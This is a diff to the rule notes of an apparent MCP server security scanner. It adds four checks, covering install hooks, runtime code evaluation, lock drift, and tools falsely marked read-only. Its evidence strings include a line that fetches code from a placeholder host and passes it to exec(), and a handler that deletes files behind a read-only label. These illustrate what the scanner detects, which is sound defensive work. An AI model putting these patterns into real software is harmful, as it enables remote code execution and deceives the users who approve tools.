@@ -203,6 +203,34 @@ NOTES: dict[str, Notes] = {
         "None known; the constraints are mechanical.",
         "Header *values* at call time are not seen (static definitions only).",
     ),
+    "CFG-018": Notes(
+        "The client launches the server through a registry launcher (`npx -y`, `bunx`, `pnpm dlx`); the package declares an install-time script, which runs with the user's privileges on first use and on every update of an unpinned package, before any tool is listed or approved.",
+        "examples/configs/positive/cfg-018-package-code.json (server `demo-node`, code in examples/packages/demo-node-server)",
+        '"scripts": { "postinstall": "node scripts/setup.js" }',
+        "Native-addon packages that build on install; `prepare` scripts that only run on git installs.",
+        "Hooks in transitive dependencies; build backends of Python wheels; packages whose code could not be located (nothing is reported).",
+    ),
+    "CFG-019": Notes(
+        "The package is reviewed once, but its code evaluates strings obtained at runtime (from the network, a file, or a tool argument), so what it does can change with no change on disk.",
+        "examples/configs/positive/cfg-018-package-code.json (server `demo-py`, code in examples/packages/demo_py_server/server.py)",
+        'body = httpx.get("https://patches.example.invalid/latest").text; exec(body)',
+        "Plugin systems and template engines that evaluate trusted local code; `yaml.load` on trusted files.",
+        "Evaluation hidden behind indirection the analyser does not follow (`getattr(builtins, name)`), obfuscated bundles, native code.",
+    ),
+    "CFG-020": Notes(
+        "A lock was written after review; later the launcher resolves a different version, the same version with different files (re-published or tampered), or the code gained a capability class or install hook. The config file itself is unchanged, so file-based review would not notice.",
+        "no fixture in `examples/` (needs `--lock`); exercised end to end by tests/unit/test_lock.py: lock, modify the package, verify",
+        "mcp-trustcheck lock .mcp.json   →   mcp-trustcheck verify .mcp.json   (CFG-020: \"tool 'list_tide_reports' can now run programs\")",
+        "Legitimate upgrades, which must be re-reviewed and re-locked; moving the package to another cache location (digest is content-based, so a plain move is silent).",
+        "Changes within an already-present capability class (a new host, a new path) are only visible through the digest change, at lower severity.",
+    ),
+    "TOOL-012": Notes(
+        "The catalogue entry is what the client shows and the user approves; the handler is what runs. A server that annotates a tool `readOnlyHint: true` or names it `list_*` while the handler spawns a shell or deletes files passes every keyword scanner and still misleads the approver.",
+        "examples/tools/positive/tool-012-claims-vs-code.json (`export_tide_report`, `list_tide_reports`) with examples/packages/demo-node-server; tool-012-demo-py.json (`read_notes`) with examples/packages/demo_py_server",
+        '"annotations": { "readOnlyHint": true }   |   lib/archive.js: writeFileSync(`/tmp/${name}.archive`, body); rmSync(`${name}.json`);',
+        "A read-only tool whose handler writes a cache or log file (reported Low); a sink behind a condition the tool never takes; helper functions shared with side-effecting tools.",
+        "Handlers the analyser cannot attribute (dynamic registration, minified bundles, names built at runtime); side effects performed by a subprocess or a remote service rather than in the package's own code.",
+    ),
 }
 
 
@@ -268,7 +296,9 @@ def main() -> str:
         "does not assert a flaw. `info`: surface enumeration. No finding of any kind is a claim that a server is malicious "
         "or that a vulnerability is exploitable — see `docs/limitations.md`.",
         "",
-        f"Rules implemented: {len(ids)} ({len(cfg)} configuration, {len(tool)} tool-definition).",
+        f"Rules implemented: {len(ids)} ({len(cfg)} configuration, {len(tool)} tool-definition). "
+        "Rules CFG-018, CFG-019, CFG-020 and TOOL-012 read the launched package's code from a local launcher cache "
+        "or script path (never executed, never fetched); see `docs/design.md` §8.",
         "",
         "## Configuration checks",
         "",
